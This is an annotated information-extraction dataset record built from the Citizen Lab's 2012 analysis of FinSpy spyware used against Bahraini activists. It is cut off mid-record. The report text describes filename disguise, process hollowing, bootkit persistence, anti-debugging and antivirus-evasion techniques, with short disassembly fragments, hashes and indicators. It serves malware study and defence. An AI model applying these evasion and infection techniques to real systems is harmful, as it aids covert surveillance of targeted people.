"T14", "type": "Malware", "name": "324783fbc33ec117f971cca77ef7ceaf7ce229a74edd6e2b3bd0effd9ed10dcc rar\u202b\u0627\u0644\u0641\u0639\u0627\u0644\u064a\u0627\u062a", "sent_id": 33, "pos": []}, {"old_id": "T15", "type": "Malware", "name": "c5b39d98c85b21f8ac1bedd91f0b6510ea255411cf19c726545c1d0a23035914 _gpjArrestedXSuspectsrar", "sent_id": 34, "pos": []}, {"old_id": "T16", "type": "Malware", "name": "c5b37bb3620d4e7635c261e5810d628fc50e4ab06b843d78105a12cfbbea40d7 KingXhamadXonXofficialXvisitXtoXrar", "sent_id": 35, "pos": []}, {"old_id": "T17", "type": "Malware", "name": "80fb86e265d44fbabac942f7b26c973944d2ace8a8268c094c3527b83169b3cc MeetingXAgendarar", "sent_id": 37, "pos": []}, {"old_id": "T18", "type": "Malware", "name": "f846301e7f190ee3bb2d3821971cc2456617edc2060b07729415c45633a5a751 Rajabrar", "sent_id": 38, "pos": []}, {"old_id": "T19", "type": "Malware", "name": "49000fc53412bfda157417e2335410cf69ac26b66b0818a3be7eff589669d040 dialogeexe", "sent_id": 40, "pos": []}, {"old_id": "T20", "type": "Malware", "name": "cc3b65a0f559fa5e6bf4e60eef3bffe8d568a93dbb850f78bdd3560f38218b5c exeRajab1jpg", "sent_id": 41, "pos": []}, {"old_id": "T21", "type": "Malware", "name": "39b325bd19e0fe6e3e0fca355c2afddfe19cdd14ebda7a5fc96491fc66e0faba exeimage1jpg", "sent_id": 42, "pos": []}, {"old_id": "T22", "type": "Malware", "name": "e48bfeab2aca1741e6da62f8b8fc9e39078db574881691a464effe797222e632 exeRajabjpg", "sent_id": 43, "pos": []}, {"old_id": "T23", "type": "Malware", "name": "2ec6814e4bad0cb03db6e241aabdc5e59661fb580bd870bdb50a39f1748b1d14 exeArrested Suspectsjpg", "sent_id": 44, "pos": []}, {"old_id": "T24", "type": "Malware", "name": "c29052dc6ee8257ec6c74618b6175abd6eb4400412c99ff34763ff6e20bab864 News about the existence of a new dialogue between AlWefaq & Govtdoc", "sent_id": 45, "pos": []}, {"old_id": "T25", "type": "Time", "name": "July 2012", "sent_id": 48, "pos": [0, 1]}, {"old_id": "T26", "type": "Obfuscation", "name": "righttoleftoverride", "sent_id": 51, "pos": []}, {"old_id": "T27", "type": "Obfuscation", "name": "RLO", "sent_id": 51, "pos": [8]}, {"old_id": "T28", "type": "Malware", "name": "Arrested Suspectsjpg", "sent_id": 62, "pos": []}, {"old_id": "T29", "type": "Malware", "name": "gpjstcepsuS detserrAexe", "sent_id": 63, "pos": []}, {"old_id": "T30", "type": "Indicator", "name": "C:\\Documents and Settings\\XPMUser\\Local Settings\\Temp\\TMP51B7AFEF", "sent_id": 67, "pos": [0, 3]}, {"old_id": "T31", "type": "TrojanHorse", "name": "C:\\DOCUME~1\\%USER%\\LOCALS~1\\Temp\\deletebat", "sent_id": 72, "pos": []}, {"old_id": "T32", "type": "TrojanHorse", "name": "C:\\DOCUME~1\\%USER%\\LOCALS~1\\Temp\\driverwsys", "sent_id": 73, "pos": []}, {"old_id": "T33", "type": "Indicator", "name": "C:\\Documents and Settings\\%USER%\\Application Data\\Microsoft\\Installer\\{5DA45CC9-D840-47CC9F86-FD2E9A718A41}", "sent_id": 75, "pos": [0, 3]}, {"old_id": "T34", "type": "TrojanHorse", "name": "driverwsys", "sent_id": 77, "pos": []}, {"old_id": "T35", "type": "TrojanHorse", "name": "deletebat", "sent_id": 77, "pos": []}, {"old_id": "T36", "type": "Time", "name": "July 2012", "sent_id": 81, "pos": [0, 1]}, {"old_id": "T37", "type": "MalwareCharacteristics", "name": "process hollowing", "sent_id": 83, "pos": []}, {"old_id": "T38", "type": "Malware", "name": "winlogonexe", "sent_id": 84, "pos": []}, {"old_id": "T39", "type": "Indicator", "name": "y:\\lsvn_branches\\finspyv401\\finspyv2\\src\\target\\bootkit_x32driver\\objfre_w2k_x86\\i386\\bootkit_x32driv erpdb", "sent_id": 101, "pos": []}, {"old_id": "T40", "type": "Malware", "name": "FinSpy", "sent_id": 105, "pos": [15]}, {"old_id": "T41", "type": "Obfuscation", "name": "virtualised packer", "sent_id": 112, "pos": [1, 2]}, {"old_id": "T42", "type": "Software", "name": "OllyDbg", "sent_id": 119, "pos": [15]}, {"old_id": "T43", "type": "Software", "name": "DbgBreakPoint", "sent_id": 128, "pos": [2]}, {"old_id": "T44", "type": "Indicator", "name": "C:\\Windows\\Installer\\{49FD463C-18F1-63C4-8F12-49F518F127}", "sent_id": 153, "pos": []}, {"old_id": "T45", "type": "File", "name": "t111o00000000dat", "sent_id": 162, "pos": []}, {"old_id": "T46", "type": "Time", "name": "Thu Jun 14 2012 12:31:34", "sent_id": 164, "pos": [0, 4]}, {"old_id": "T47", "type": "Time", "name": "Thu Jun 14 2012 12:32:18", "sent_id": 165, "pos": [0, 4]}, {"old_id": "T48", "type": "Time", "name": "Thu Jun 14 2012 12:55:12", "sent_id": 166, "pos": [0, 4]}, {"old_id": "T49", "type": "Indicator", "name": "XXY1TTTTTTTTdat", "sent_id": 174, "pos": []}, {"old_id": "T50", "type": "Obfuscation", "name": "AES-256-CBC", "sent_id": 179, "pos": [8]}, {"old_id": "T51", "type": "File", "name": "%USERPROFILE%\\Local Settings\\Temp\\smtXXtmp", "sent_id": 237, "pos": []}, {"old_id": "T52", "type": "File", "name": "smtXXtmp", "sent_id": 238, "pos": []}, {"old_id": "T53", "type": "File", "name": "1431028D41FDdat", "sent_id": 240, "pos": []}, {"old_id": "T54", "type": "Address", "name": "7769140194", "sent_id": 259, "pos": []}, {"old_id": "T55", "type": "Organization", "name": "Batelco", "sent_id": 262, "pos": [9]}, {"old_id": "T56", "type": "Organization", "name": "WHOIS", "sent_id": 262, "pos": [0]}, {"old_id": "T57", "type": "Address", "name": "7769140194", "sent_id": 281, "pos": []}, {"old_id": "T58", "type": "Address", "name": "19216813165", "sent_id": 281, "pos": []}, {"old_id": "T59", "type": "Address", "name": "19216813165", "sent_id": 282, "pos": []}, {"old_id": "T60", "type": "Address", "name": "7769149194", "sent_id": 282, "pos": []}, {"old_id": "T61", "type": "Malware", "name": "finspyv401", "sent_id": 288, "pos": []}, {"old_id": "T62", "type": "Malware", "name": "finspyv2", "sent_id": 289, "pos": []}, {"old_id": "T63", "type": "MD5", "name": "c488a8aaef0df577efdf1b501611ec20", "sent_id": 331, "pos": [1]}, {"old_id": "T64", "type": "SHA-1", "name": "5ea6ae50063da8354e8500d02d0621f643827346", "sent_id": 332, "pos": [1]}, {"old_id": "T65", "type": "SHA-256", "name": "81531ce5a248aead7cda76dd300f303dafe6f1b7a4c953ca4d7a9a27b5cd6cdf", "sent_id": 333, "pos": [1]}, {"old_id": "T66", "type": "Indicator", "name": "tigergamma-internationalde", "sent_id": 335, "pos": []}, {"old_id": "T67", "type": "Indicator", "name": "ff-demoblogdnsorg", "sent_id": 336, "pos": []}, {"old_id": "T68", "type": "Person", "name": "Martin Muench", "sent_id": 339, "pos": [1, 2]}, {"old_id": "T69", "type": "Organization", "name": "Gamma International GmbH", "sent_id": 340, "pos": [1, 3]}, {"old_id": "T70", "type": "Location", "name": "Munich", "sent_id": 343, "pos": [1]}, {"old_id": "T71", "type": "Email", "name": "info@gamma-internationalde", "sent_id": 347, "pos": []}, {"old_id": "T72", "type": "Time", "name": "2011-04-04T11:24:20+02:00", "sent_id": 348, "pos": [1]}, {"old_id": "T73", "type": "Indicator", "name": "ff-demoblogdnsorg", "sent_id": 354, "pos": []}], "labels": [{"old_id": "R1", "r": "P17", "h": 1, "t": 2, "evidence": [7]}, {"old_id": "R2", "r": "P21", "h": 38, "t": 39, "evidence": [101, 102, 103, 104, 105]}], "title": ["inputs/txt/201207CitizenLabFinFisher"], "sents": [["Research", "Brief"], ["July", "2012"], ["The", "Citizen", "Lab"], ["From", "Bahrain", "with", "Love:"], ["FinFisher\u2019s", "Spy", "Kit", "Exposed", "?"], ["Author:", "Morgan", "Marquis-Boire"], ["INTRODUCTION"], ["The", "FinFisher", "Suite", "is", "described", "by", "its", "distributors", ",", "Gamma", "International", "UK", "Ltd", ".", ",", "as", "\"Governmental", "IT"], ["Intrusion", "and", "Remote", "Monitoring", "Solutions", ".", "\"", "1", "The", "toolset", "first", "gained", "notoriety", "after", "it", "was", "revealed", "that", "the"], ["Egyptian", "Government\u2019s", "state", "security", "apparatus", "had", "been", "involved", "in", "negotiations", "with", "Gamma", "International"], ["UK", "Ltd", ".", "over", "the", "purchase", "of", "the", "software", ".", "Promotional", "materials", "have", "been", "leaked", "that", "describe", "the", "tools", "as"], ["providing", "a", "wide", "range", "of", "intrusion", "and", "monitoring", "capabilities", ".", "2", "Despite", "this", ",", "however", ",", "the", "toolset", "itself", "has"], ["not", "been", "publicly", "analyzed", "."], ["This", "post", "contains", "analysis", "of", "several", "pieces", "of", "malware", "obtained", "by", "Vernon", "Silver", "of", "Bloomberg", "News", "that"], ["were", "sent", "to", "Bahraini", "pro-democracy", "activists", "in", "April", "and", "May", "of", "this", "year", ".", "The", "purpose", "of", "this", "work", "is"], ["identification", "and", "classification", "of", "the", "malware", "to", "better", "understand", "the", "actors", "behind", "the", "attacks", "and", "the", "risk"], ["to", "victims", ".", "In", "order", "to", "accomplish", "this", ",", "we", "undertook", "several", "different", "approaches", "during", "the", "investigation", "."], ["As", "well", "as", "directly", "examining", "the", "samples", "through", "static", "and", "dynamic", "analysis", ",", "we", "infected", "a", "virtual", "machine"], ["(VM)", "with", "the", "malware", ".", "We", "monitored", "the", "filesystem", ",", "network", ",", "and", "running", "operating", "system", "of", "the", "infected"], ["VM", "."], ["This", "analysis", "suggests", "the", "use", "of", "\u201cFinspy\u201d", ",", "part", "of", "the", "commercial", "intrusion", "kit", ",", "Finfisher", ",", "distributed", "by"], ["Gamma", "International", "."], ["July", "2012"], ["DELIVERY"], ["This", "section", "describes", "how", "the", "malware", "was", "delivered", "to", "potential", "victims", "using", "e-mails", "with", "malicious"], ["attachments", "."], ["In", "early", "May", ",", "we", "were", "alerted", "that", "Bahraini", "activists", "were", "targeted", "with", "apparently", "malicious", "e-mails", ".", "The"], ["emails", "ostensibly", "pertained", "to", "the", "ongoing", "turmoil", "in", "Bahrain", ",", "and", "encouraged", "recipients", "to", "open", "a", "series", "of"], ["suspicious", "attachments", ".", "The", "screenshot", "below", "is", "indicative", "of", "typical", "message", "content:"], ["The", "attachments", "to", "the", "e-mails", "we", "have", "been", "able", "to", "analyze", "were", "typically", "", ".", "rar", "files", ",", "which", "we", "found", "to"], ["contain", "malware", ".", "Note", "that", "the", "apparent", "sender", "has", "an", "e-mail", "address", "that", "indicates", "that", "it", "was", "being", "sent", "by"], ["\u201cMelissa", "Chan", ",", "\u201d", "who", "is", "a", "real", "correspondent", "for", "Aljazeera", "English", ".", "We", "suspect", "that", "the", "e-mail", "address", "is", "not"], ["her", "real", "address", ".", "3", "The", "following", "samples", "were", "examined:"], ["324783fbc33ec117f971cca77ef7ceaf7ce229a74edd6e2b3bd0effd9ed10dcc", "rar", ".", "\u202b\u0627\u0644\u0641\u0639\u0627\u0644\u064a\u0627\u062a\u202c"], ["c5b39d98c85b21f8ac1bedd91f0b6510ea255411cf19c726545c1d0a23035914", "_gpj", ".", "ArrestedXSuspects.rar"], ["c5b37bb3620d4e7635c261e5810d628fc50e4ab06b843d78105a12cfbbea40d7"], ["KingXhamadXonXofficialXvisitXtoX", ".", "rar"], ["80fb86e265d44fbabac942f7b26c973944d2ace8a8268c094c3527b83169b3cc", "MeetingXAgenda", ".", "rar"], ["f846301e7f190ee3bb2d3821971cc2456617edc2060b07729415c45633a5a751", "Rajab", ".", "rar"], ["These", "contained", "executables", "masquerading", "as", "picture", "files", "or", "documents:"], ["49000fc53412bfda157417e2335410cf69ac26b66b0818a3be7eff589669d040", "dialoge", ".", "exe"], ["cc3b65a0f559fa5e6bf4e60eef3bffe8d568a93dbb850f78bdd3560f38218b5c", "exe", ".", "Rajab1.jpg"], ["39b325bd19e0fe6e3e0fca355c2afddfe19cdd14ebda7a5fc96491fc66e0faba", "exe", ".", "image1.jpg"], ["e48bfeab2aca1741e6da62f8b8fc9e39078db574881691a464effe797222e632", "exe", ".", "Rajab.jpg"], ["2ec6814e4bad0cb03db6e241aabdc5e59661fb580bd870bdb50a39f1748b1d14", "exe", ".", "Arrested", "Suspects", ".", "jpg"], ["c29052dc6ee8257ec6c74618b6175abd6eb4400412c99ff34763ff6e20bab864", "News", "about", "the", "existence", "of", "a"], ["new", "dialogue", "between", "AlWefaq", "&", "Govt", ".", ".doc"], ["2"], ["July", "2012"], ["The", "emails", "generally", "suggested", "that", "the", "attachments", "contained", "political", "content", "of", "interest", "to", "pro-democracy"], ["activists", "and", "dissidents", ".", "In", "order", "to", "disguise", "the", "nature", "of", "the", "attachments", "a", "malicious", "usage", "of"], ["the", "\u201crighttoleftoverride\"", "(RLO)", "character", "was", "employed", ".", "The", "RLO", "character", "(U+202e", "in", "unicode)", "controls", "the"], ["positioning", "of", "characters", "in", "text", "containing", "characters", "flowing", "from", "right", "to", "left", ",", "such", "as", "Arabic", "or", "Hebrew", "."], ["The", "malware", "appears", "on", "a", "victim\u2019s", "desktop", "as", "\"exe", ".", "Rajab1.jpg\"", "(for", "example)", ",", "along", "with", "the", "default"], ["Windows", "icon", "for", "a", "picture", "file", "without", "thumbnail", ".", "But", ",", "when", "the", "UTF-8", "based", "filename", "is", "displayed", "in"], ["ANSI", ",", "the", "name", "is", "displayed", "as", "\"gpj", ".", "1bajaR.exe\u201d.", "Believing", "that", "they", "are", "opening", "a", "harmless", "\u201c", ".", "jpg\u201d,", "victims"], ["are", "instead", "tricked", "into", "running", "an", "executable", "\"", ".", "exe\"", "file", ".", "4"], ["Upon", "execution", "these", "files", "install", "a", "multi-featured", "trojan", "on", "the", "victim\u2019s", "computer", ".", "This", "malware", "provides", "the"], ["attacker", "with", "clandestine", "remote", "access", "to", "the", "victim\u2019s", "machine", "as", "well", "as", "comprehensive", "data", "harvesting", "and"], ["exfiltration", "capabilities", "."], ["INSTALLATION"], ["This", "section", "describes", "how", "the", "malware", "infects", "the", "target", "machine", "."], ["The", "malware", "displays", "a", "picture", "as", "expected", ".", "This", "differs", "from", "sample", "to", "sample", ".", "The", "sample", "\u201cArrested"], ["Suspects", ".", "jpg\u201d", "(\u201cgpj", ".", "stcepsuS", "detserrA", ".", "exe\u201d)", "displays:"], ["3"], ["July", "2012"], ["It", "additionally", "creates", "a", "directory", "(which", "appears", "to", "vary", "from", "sample", "to", "sample):"], ["C:\\Documents", "and", "Settings\\XPMUser\\Local", "Settings\\Temp\\TMP51B7AFEF"], ["It", "copies", "itself", "there", "(in", "this", "case", "the", "malware", "appears", "as", "\u201cArrested", "Suspects", ".", "jpg\u201d)", "where", "it", "is", "renamed:"], ["C:\\Documents", "and", "Settings\\XPMUser\\Local", "Settings\\Temp\\TMP51B7AFEF\\Arrested", "Suspects", ".", "jpg\u201d", "=>"], ["C:\\Documents", "and", "Settings\\XPMUser\\Local", "Settings\\Temp\\TMP51B7AFEF\\tmpD", ".", "tmp"], ["Then", "it", "drops", "the", "following", "files:"], ["C:\\DOCUME~1\\%USER%\\LOCALS~1\\Temp\\delete", ".", "bat"], ["C:\\DOCUME~1\\%USER%\\LOCALS~1\\Temp\\driverw", ".", "sys"], ["It", "creates", "the", "folder", "(the", "name", "of", "which", "varies", "from", "host", "to", "host):"], ["C:\\Documents", "and", "Settings\\%USER%\\Application", "Data\\Microsoft\\Installer\\{5DA45CC9-D840-47CC9F86-FD2E9A718A41}"], ["This", "process", "is", "observable", "on", "the", "filesystem", "timeline", "of", "the", "infected", "host", "(click", "image", "to", "enlarge):"], ["\u201cdriverw", ".", "sys\u201d", "is", "loaded", "and", "then", "\u201cdelete", ".", "bat\u201d", "is", "run", "which", "deletes", "the", "original", "payload", "and", "itself", ".", "It", "then"], ["infects", "existing", "operating", "system", "processes", ",", "connects", "to", "the", "command", "and", "control", "server", ",", "and", "begins", "data"], ["harvesting", "and", "exfiltration", "."], ["4"], ["July", "2012"], ["Examining", "the", "memory", "image", "of", "a", "machine", "infected", "with", "the", "malware", "shows", "that", "a", "technique", "for", "infecting"], ["processes", "known", "as", "\u201cprocess", "hollowing\"", "is", "used", ".", "For", "example", ",", "the", "memory", "segment", "below", "from", "the"], ["\u201cwinlogon", ".", "exe\u201d", "process", "is", "marked", "as", "executable", "and", "writeable:"], ["Here", "the", "malware", "starts", "a", "new", "instance", "of", "a", "legitimate", "process", "such", "as", "\u201cwinlogon", ".", "exe\u201d", "and", "before", "the"], ["process\u2019s", "first", "thread", "begins", ",", "the", "malware", "de-allocates", "the", "memory", "containing", "the", "legitimate", "code", "and", "injects"], ["malicious", "code", "in", "its", "place", ".", "Dumping", "and", "examining", "this", "memory", "segment", "reveals", "the", "following", "strings", "in", "the"], ["infected", "process:"], ["Note", "the", "string:"], ["y:\\lsvn_branches\\finspyv4", ".", "01\\finspyv2\\src\\libs\\libgmp\\mpn-tdiv_qr.c"], ["5"], ["July", "2012"], ["This", "file", "seems", "to", "correspond", "to", "a", "file", "in", "the", "GNU", "Multi-Precision", "arithmetic", "library:"], ["http://gmplib", ".", "org:8000/gmp/file/b5ca16212198/mpn/generic/tdiv_qr.c"], ["The", "process", "\u201csvchost", ".", "exe\u201d", "was", "also", "found", "to", "be", "infected", "in", "a", "similar", "manner:"], ["6"], ["July", "2012"], ["Further", "examination", "of", "the", "memory", "dump", "also", "reveals", "the", "following:"], ["This", "path", "appears", "to", "reference", "the", "functionality", "that", "the", "malware", "uses", "to", "modify", "the", "boot", "sequence", "to", "enable"], ["persistence:"], ["y:\\lsvn_branches\\finspyv4", ".", "01\\finspyv2\\src\\target\\bootkit_x32driver\\objfre_w2k_x86\\i386\\bootkit_x32driv"], ["er", ".", "pdb"], ["A", "pre-infection", "vs", "post-infection", "comparison", "of", "the", "infected", "VM", "shows", "that", "the", "Master", "Boot", "Record", "(MBR)"], ["was", "modified", "by", "code", "injected", "by", "the", "malware", "."], ["The", "strings", "found", "in", "memory", "\u201cfinspyv4", ".", "01\u201d", "and", "\u201cfinspyv2\u201d", "are", "particularly", "interesting", ".", "The", "FinSpy", "tool", "is"], ["part", "of", "the", "FinFisher", "intrusion", "and", "monitoring", "toolkit", ".", "5"], ["OBFUSCATION", "AND", "EVASION"], ["This", "section", "describes", "how", "the", "malware", "is", "designed", "to", "resist", "analysis", "and", "evade", "identification", "."], ["The", "malware", "employs", "a", "myriad", "of", "techniques", "designed", "to", "evade", "detection", "and", "frustrate", "analysis", ".", "While"], ["investigation", "into", "this", "area", "is", "far", "from", "complete", ",", "we", "discuss", "several", "discovered", "methods", "as", "examples", "of", "the"], ["lengths", "taken", "by", "the", "developers", "to", "avoid", "identification", "."], ["A", "virtualised", "packer", "is", "used", ".", "This", "type", "of", "obfuscation", "is", "used", "by", "those", "that", "have", "\u201cstrong", "motives", "to", "prevent"], ["their", "malware", "from", "being", "analyzed\u201d", ".", "6"], ["This", "converts", "the", "native", "x86", "instructions", "of", "the", "malware", "into", "another", "custom", "language", "chosen", "from", "one", "of", "11"], ["code", "templates", ".", "At", "run-time", ",", "this", "is", "interpreted", "by", "an", "obfuscated", "interpreter", "customized", "for", "that", "particular"], ["language", ".", "This", "virtualised", "packer", "was", "not", "recognised", "and", "appears", "to", "be", "bespoke", "."], ["7"], ["July", "2012"], ["Several", "anti-debugging", "techniques", "are", "used", ".", "This", "section", "of", "code", "crashes", "the", "popular", "debugger", ",", "OllyDbg", "."], ["", ".", "text:00401683", "finit"], ["", ".", "text:00401686", "fld", "ds:tbyte_40168E"], ["", ".", "text:0040168C", "jmp", "short", "locret_401698"], ["--------------------------------------------------------------------", ".", "text:0040168E", "tbyte_40168E", "dt", "9", ".", "2233720368547758075e18"], ["--------------------------------------------------------------------", ".", "text:00401698", "locret_401698:"], ["", ".", "text:00401698", "retn"], ["This", "float", "value", "causes", "OllyDbg", "to", "crash", "when", "trying", "to", "display", "its", "value", ".", "A", "more", "detailed", "explanation", "of", "this"], ["can", "be", "found", "here", "."], ["To", "defeat", "DbgBreakPoint", "based", "debuggers", ",", "the", "malware", "finds", "the", "address", "of", "DbgBreakPoint", ",", "makes", "the", "page"], ["EXECUTE_READWRITE", "and", "writes", "a", "NOP", "on", "the", "entry", "point", "of", "DbgBreakPoint", "."], ["The", "malware", "checks", "via", "PEB", "to", "detect", "whether", "or", "not", "it", "is", "being", "debugged", ",", "and", "if", "it", "is", "it", "returns", "a", "random"], ["address", "."], ["The", "malware", "calls", "ZwSetInformationThread", "with", "ThreadInformationClass", "set", "to", "0x11", ",", "which", "causes", "the"], ["thread", "to", "be", "detached", "from", "the", "debugger", "."], ["The", "malware", "calls", "ZwQueryInformationProcess", "with", "ThreadInformationClass", "set", "to", "0x(ProcessDebugPort)"], ["and", "0x1e", "(ProcessDebugObjectHandle)", "to", "detect", "the", "presence", "of", "a", "debugger", ".", "If", "a", "debugger", "is", "detected", "it", "jumps"], ["to", "a", "random", "address", ".", "ZwQueryInformationProcess", "is", "also", "called", "to", "check", "the", "DEP", "status", "on", "the", "current"], ["process", ",", "and", "it", "disables", "it", "if", "it\u2019s", "found", "to", "be", "enabled", "."], ["The", "malware", "deploys", "a", "granular", "solution", "for", "Antivirus", "software", ",", "tailored", "to", "the", "AV", "present", "on", "the", "infected"], ["machine", ".", "The", "malware", "calls", "ZwQuerySystemInformation", "to", "get", "ProcessInformation", "and", "ModuleInformation", "."], ["The", "malware", "then", "walks", "the", "list", "of", "processes", "and", "modules", "looking", "for", "installed", "AV", "software", ".", "Our", "analysis"], ["indicates", "that", "the", "malware", "appears", "to", "have", "different", "code", "to", "Open/Create", "process", "and", "inject", "for", "each", "AV"], ["solution", ".", "For", "some", "Anti-Virus", "software", "this", "even", "appears", "to", "be", "version", "dependent", ".", "The", "function"], ["\u201cZwQuerySystemInformation\u201d", "is", "also", "hooked", "by", "the", "malware", ",", "a", "technique", "frequently", "used", "to", "allow", "process"], ["hiding:"], ["8"], ["July", "2012"], ["DATA", "HARVESTING", "AND", "ENCRYPTION"], ["This", "section", "describes", "how", "the", "malware", "collects", "and", "encrypts", "data", "from", "the", "infected", "machine", "."], ["9"], ["July", "2012"], ["Our", "analysis", "showed", "that", "the", "malware", "collects", "a", "wide", "range", "of", "data", "from", "an", "infected", "victim", ".", "The", "data", "is"], ["stored", "locally", "in", "a", "hidden", "directory", ",", "and", "is", "disguised", "with", "encryption", "prior", "to", "exfiltration", "."], ["\"C:\\Windows\\Installer\\{49FD463C-18F1-63C4-8F12-49F518F127}", ".", "\""], ["On", "the", "reference", "victim", "host", ",", "the", "directory", "was:"], ["We", "conducted", "forensic", "examination", "of", "the", "files", "created", "in", "this", "directory", "and", "identified", "a", "wide", "range", "of", "data"], ["collected", ".", "Files", "in", "this", "directory", "were", "found", "to", "be", "screenshots", ",", "keylogger", "data", ",", "audio", "from", "Skype", "calls", ","], ["passwords", "and", "more", ".", "For", "the", "sake", "of", "brevity", "we", "include", "a", "limited", "set", "of", "examples", "here", "."], ["The", "malware", "attempts", "to", "locate", "the", "configuration", "and", "password", "store", "files", "for", "a", "variety", "browsers", "and", "chat"], ["clients", "as", "seen", "below:"], ["10"], ["July", "2012"], ["We", "observed", "the", "creation", "of", "the", "file", "\u201ct111o00000000", ".", "dat\u201d", "in", "the", "data", "harvesting", "directory", ",", "as", "shown", "in", "the"], ["filesystem", "timeline", "below:"], ["Thu", "Jun", "14", "2012", "12:31:34", "52719", "mac", ".", "r/rr-xr-xr-x", "0", "0", "26395-128-5", "C:/WINDOWS/Installer/{49FD463C18F1-63C4-8F12-49F518F127}/09e493e2-05f9-4899-b661-c52f3554c644"], ["Thu", "Jun", "14", "2012", "12:32:18", "285691", "", ".", "..b", "r/rrwxrwxrwx", "0", "0", "26397-128-4", "C:/WINDOWS/Installer/{49FD463C18F1-63C4-8F12-49F518F127}/t111o00000000", ".", "dat"], ["Thu", "Jun", "14", "2012", "12:55:12", "285691", "mac", ".", "r/rrwxrwxrwx", "0", "0", "26397-128-4"], ["C:/WINDOWS/Installer/{49FD463C-18F1-63C4-8F12-49F518F127}/t111o00000000", ".", "dat"], ["4096", "", ".", ".c.", "-/rr-xr-xr-x", "0", "0", "26447-128-4"], ["The", "infected", "process", "\u201cwinlogon", ".", "exe\u201d", "was", "observed", "writing", "this", "file", "via", "Process:"], ["11"], ["July", "2012"], ["Examination", "of", "this", "file", "reveals", "that", "it", "is", "a", "screenshot", "of", "the", "desktop:"], ["Many", "other", "modules", "providing", "specific", "exfiltration", "capabilities", "were", "observed", ".", "Generally", ",", "the", "exfiltration"], ["modules", "write", "files", "to", "disk", "using", "the", "following", "naming", "convention:", "XXY1TTTTTTTT", ".", "dat.", "XX", "is", "a", "two-digit"], ["hexadecimal", "module", "number", ",", "Y", "is", "a", "single-digit", "hexadecimal", "submodule", "number", ",", "and", "TTTTTTTT", "is", "a"], ["hexadecimal", "representation", "of", "a", "unix", "timestamp", "(less", "1", ".", "3", "billion)", "associated", "with", "the", "file", "creation", "time", "."], ["ENCRYPTION"], ["The", "malware", "uses", "encryption", "in", "an", "attempt", "to", "disguise", "harvested", "data", "in", "the", "", ".", "dat", "files", "intended", "for", "exfiltration", "."], ["Data", "written", "to", "the", "files", "is", "encrypted", "using", "AES-256-CBC", "(with", "no", "padding)", ".", "The", "32-byte", "key", "consists", "of", "8"], ["readings", "from", "memory", "address", "0x7ffe0014:", "a", "special", "address", "in", "Windows", "that", "contains", "the", "low-order-4-bytes"], ["of", "the", "number", "of", "hundred-nanoseconds", "since", "1", "January", "1601", ".", "The", "IV", "consists", "of", "4", "additional", "readings", "."], ["The", "AES", "key", "structure", "is", "highly", "predictable", ",", "as", "the", "quantum", "for", "updating", "the", "system"], ["clock", "(HKLM\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\Config\\LastClockRate)", "is", "set", "to"], ["12"], ["July", "2012"], ["0x2625A", "hundred-nanoseconds", "by", "default", ",", "and", "the", "clock", "readings", "that", "comprise", "the", "key", "and", "IV", "are", "taken", "in", "a"], ["tight", "loop:"], ["", ".", ".."], ["0x406EA4:", "8D45C0", "LEA", "EAX", ",", "[EBP-0x40]"], ["0x406EA7:", "50", "PUSH", "EAX"], ["0x406EA8:", "FF150C10AF01", "CALL", "DWORD", "PTR", "[0x1AF100C]"], ["0x406EAE:", "8B4DE8", "MOV", "ECX", ",", "DWORD", "PTR", "[EBP-0x18]"], ["0x406EB1:", "8B45C0", "MOV", "EAX", ",", "DWORD", "PTR", "[EBP-0x40]"], ["0x406EB4:", "8345E804", "ADD", "DWORD", "PTR", "[EBP-0x18]", ",", "0x4"], ["0x406EB8:", "6A01", "PUSH", "0x1"], ["0x406EBA:", "89040F", "MOV", "DWORD", "PTR", "[EDI+ECX]", ",", "EAX"], ["0x406EBD:", "FF152810AF01", "CALL", "DWORD", "PTR", "[0x1AF1028]"], ["0x406EC3:", "817DE800010000", "CMP", "DWORD", "PTR", "[EBP-0x18]", ",", "0x100"], ["0x406ECA:", "72D8", "JB", "0x406EA4"], ["0x406ECC:", "80277F", "AND", "BYTE", "PTR", "[EDI]", ",", "0x7F"], ["", ".", ".."], ["The", "following", "AES", "keys", "were", "among", "those", "found", "to", "be", "used", "to", "encrypt", "records", "in", "", ".", "dat", "files", ".", "The", "first", "contains"], ["the", "same", "4", "bytes", "repeated", ",", "whereas", "in", "the", "second", "key", ",", "the", "difference", "between", "all", "consecutive", "4-byte", "blocks"], ["(with", "byte", "order", "swapped)", "is", "0x2625A", "."], ["70", "31", "bd", "cc", "70", "31", "bd", "cc", "70", "31", "bd", "cc", "70", "31", "bd", "cc", "70", "31", "bd", "cc", "70", "31", "bd", "cc", "70", "31"], ["bd", "cc", "70", "31", "bd", "cc"], ["26", "e9", "23", "60", "80", "4b", "26", "60", "da", "ad", "28", "60", "34", "10", "2b", "60", "8e", "72", "2d", "60", "e8", "d4", "2f", "60", "42", "37"], ["32", "60", "9c", "99", "34", "60"], ["In", "all", ",", "64", "clock", "readings", "are", "taken", ".", "The", "readings", "are", "encrypted", "using", "an", "RSA", "public", "key", "found", "in", "memory"], ["(whose", "modulus", "begins", "with", "A25A944E)", "and", "written", "to", "the", "", ".", "dat", "file", "before", "any", "other", "encrypted", "data", ".", "No"], ["padding", "is", "used", "in", "the", "encryption", ",", "yielding", "exactly", "256", "encrypted", "bytes", ".", "After", "the", "encrypted", "timestamp"], ["values", ",", "the", "file", "contains", "a", "number", "of", "records", "encrypted", "with", "AES", ",", "delimited", "by", "EAE9E8FF", "."], ["13"], ["July", "2012"], ["In", "reality", ",", "these", "records", "are", "only", "partially", "encrypted:", "if", "the", "record\u2019s", "length", "is", "not", "a", "multiple", "of", "16", "bytes", "(the"], ["AES", "block", "size)", ",", "then", "the", "remainder", "of", "the", "bytes", "are", "written", "to", "the", "file", "unencrypted", ".", "For", "example", ",", "after", "typing"], ["\u201cFinSpy\u201d", "on", "the", "keyboard", ",", "the", "keylogger", "module", "produced", "the", "following", "(trailing", "plaintext", "highlighted):"], ["The", "predictability", "of", "the", "AES", "encryption", "keys", "allowed", "us", "to", "decrypt", "and", "view", "these", "partially-encrypted"], ["records", "in", "full", "plaintext", ".", "The", "nature", "of", "the", "records", "depends", "on", "the", "particular", "module", "and", "submodule", ".", "For"], ["example", ",", "submodule", "Y", "==", "5", "of", "the", "Skype", "exfiltration", "module", "(XX", "==", "14)", ",", "contains", "a", "csv", "representation", "of", "the"], ["user\u2019s", "contact", "list:"], ["Record", "#", "0", "Length:", "243", "bytes:"], ["\u00f3"], ["@\u00fe\u00ff\u00cc\u00b3\u00d0"], ["@"], ["\u00a4b\u00afOp\u00fe192", ".", "168.131.67JRecordingEcsv", 